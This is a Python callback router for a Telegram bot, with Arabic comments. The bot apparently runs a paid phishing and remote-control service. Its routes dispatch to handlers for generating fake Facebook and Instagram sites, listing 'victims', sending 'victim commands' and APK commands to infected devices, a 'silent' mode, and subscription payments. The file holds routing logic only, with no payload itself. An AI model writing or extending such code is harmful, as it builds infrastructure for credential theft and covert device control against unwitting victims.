# bot_handlers/callbacks/router.py
# ============================================================
# الموجّه الرئيسي — يوزّع الـ callback للـ handler المناسب
# ============================================================

from config import bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers.callbacks.router")


# ─── استيراد كل الـ handlers ───
from . import help as help_cb
from . import search as search_cb
from . import facebook as fb_cb
from . import instagram as ig_cb
from . import silent as silent_cb
from . import dashboard as dash_cb
from . import victims as victims_cb
from . import victim_commands as vcmd_cb
from . import apk_commands as apk_cmd_cb
from . import updates as upd_cb
from . import payment as payment_cb
from . import admin as admin_cb
from . import misc as misc_cb


# ─── ترتيب الفحص (الأهم أولاً) ───
# كل عنصر: (دالة الفحص, دالة التنفيذ)
ROUTES = [
    # misc (first — noop, back)
    (lambda d: d == "noop", misc_cb.handle),
    (lambda d: d == "back_to_main", misc_cb.handle),

    # help
    (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),

    # search
    (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),

    # facebook
    (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),

    # instagram
    (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),

    # silent
    (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),

    # dashboard
    (lambda d: d == "open_dashboard", dash_cb.handle),

    # payment
    (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),

    # updates
    (lambda d: d.startswith("upd_"), upd_cb.handle),

    # admin ★
    (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),

    # victim commands (vcmd_)
    (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),

    # apk commands (apk_cmd_)
    (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),

    # victims (v_*)
    (lambda d: d.startswith("v_"), victims_cb.handle),
]


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    try:
        for matcher, handler in ROUTES:
            try:
                if matcher(data):
                    handler(call, chat_id, user_id, data)
                    return
            except Exception as e:
                logger.exception(f"route match error for {data}: {e}")
                continue

        # لم يُعثر على route
        logger.warning(f"Unhandled callback: {data}")
        bot.answer_callback_query(call.id)

    except Exception as e:
        logger.exception(f"callback_handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})
